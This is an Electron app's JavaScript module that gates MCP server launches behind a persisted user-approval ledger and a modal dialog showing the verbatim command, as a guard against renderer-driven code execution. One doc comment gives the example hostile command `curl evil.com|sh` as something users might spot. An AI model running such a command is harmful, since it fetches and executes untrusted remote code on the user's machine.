/**
 * MCP server approval ledger.
 *
 * The MCP IPC channel (`mcp:sync-servers`) accepts arbitrary `command` and
 * `args` strings from the renderer. Without a gate, a malicious renderer
 * (XSS in chat, hostile plugin page) can configure an MCP server with any
 * local binary and spawn it under the user's identity — RCE.
 *
 * This module is the gate. Every (serverId, command, args) tuple must be
 * approved by the user once before the host will spawn it. Approvals are
 * persisted to disk so the user only confirms each combination one time.
 *
 * If the renderer later changes the command for an already-approved
 * server, the new combination's hash differs and we re-prompt — preventing
 * silent escalation through later edits.
 *
 * Approval requests surface as a native Electron message-box dialog
 * (modal, blocking) showing the verbatim command + args. The user clicks
 * Approve or Reject. Rejected servers stay in the desired list but their
 * status is `awaiting_approval` until the user clicks Approve in the
 * Settings UI (which re-runs the sync, retriggering the dialog).
 */

import { BrowserWindow, app, dialog } from 'electron'
import fs from 'node:fs/promises'
import path from 'node:path'
import { hashMcpCommand } from './mcpApprovalsHash.js'
import { createAsyncLock } from './asyncLock.js'

export { hashMcpCommand }

const APPROVALS_FILE_NAME = 'mcp-approvals.json'

let _approvalsCache = null
const withWriteLock = createAsyncLock()

function getApprovalsPath() {
  return path.join(app.getPath('userData'), APPROVALS_FILE_NAME)
}

async function loadApprovals() {
  if (_approvalsCache) return _approvalsCache
  try {
    const raw = await fs.readFile(getApprovalsPath(), 'utf8')
    const parsed = JSON.parse(raw)
    if (parsed && typeof parsed === 'object') {
      _approvalsCache = parsed
      return _approvalsCache
    }
  } catch {
    // Missing / corrupt — start with empty ledger.
  }
  _approvalsCache = {}
  return _approvalsCache
}

async function saveApprovals(approvals) {
  await fs.writeFile(
    getApprovalsPath(),
    JSON.stringify(approvals, null, 2),
    { encoding: 'utf8', mode: 0o600 },
  )
}

/**
 * Returns true when the given (serverId, commandHash) tuple is recorded in
 * the approval ledger. Used by mcpHost before any spawn.
 */
export async function isMcpServerApproved(serverId, commandHash) {
  const approvals = await loadApprovals()
  return approvals[serverId] === commandHash
}

/**
 * Persist a new approval entry. Should only be called after the user has
 * explicitly granted approval (e.g. via the dialog below).
 */
export async function recordMcpApproval(serverId, commandHash) {
  await withWriteLock(async () => {
    const approvals = await loadApprovals()
    approvals[serverId] = commandHash
    await saveApprovals(approvals)
  })
}

/**
 * Drop a stored approval. Used when the user removes an MCP server from
 * settings, or as a "forget all" admin action in future.
 */
export async function revokeMcpApproval(serverId) {
  await withWriteLock(async () => {
    const approvals = await loadApprovals()
    if (serverId in approvals) {
      delete approvals[serverId]
      await saveApprovals(approvals)
    }
  })
}

/**
 * Show a native modal dialog asking the user to approve a specific
 * (serverId, command, args) combination. Returns true if Approved, false
 * if Rejected or the dialog couldn't be shown.
 *
 * The dialog deliberately shows the full command + args verbatim so the
 * user can spot something like `/bin/sh -c "curl evil.com|sh"`. We do not
 * pre-summarise — the raw payload is the security signal.
 */
export async function promptMcpApproval(serverId, command, args = []) {
  const argsArr = Array.isArray(args) ? args : []
  const argsLine = argsArr.length > 0 ? argsArr.join(' ') : '(no arguments)'

  // Try to anchor the dialog to the focused window so it's modal-correct
  // on macOS / Linux. If no window is up yet (early startup), fall back to
  // a parent-less dialog — still blocks until the user responds.
  const parent = BrowserWindow.getFocusedWindow() ?? BrowserWindow.getAllWindows()[0] ?? null

  let result
  try {
    result = await dialog.showMessageBox(parent ?? undefined, {
      type: 'warning',
      title: 'Approve MCP server launch',
      message: `Allow Nexus to launch the MCP server "${serverId}"?`,
      detail:
        `Command:\n  ${command}\n\nArguments:\n  ${argsLine}\n\n`
        + 'MCP servers run as local subprocesses with full access to your '
        + 'files and network. Only approve commands you have configured '
        + 'yourself or that you fully trust. You can revoke approval later '
        + 'from Settings → Integrations → MCP.',
      buttons: ['Reject', 'Approve'],
      defaultId: 0,
      cancelId: 0,
      noLink: true,
    })
  } catch (error) {
    console.warn('[mcpApprovals] Failed to show approval dialog:', error?.message ?? error)
    return false
  }

  if (result.response !== 1) return false

  await recordMcpApproval(serverId, hashMcpCommand(command, argsArr))
  return true
}

/**
 * Test helper. Resets the in-memory cache so subsequent calls re-read the
 * approval file from disk. Production code never needs this.
 */
export function __resetMcpApprovalsCache() {
  _approvalsCache = null
}
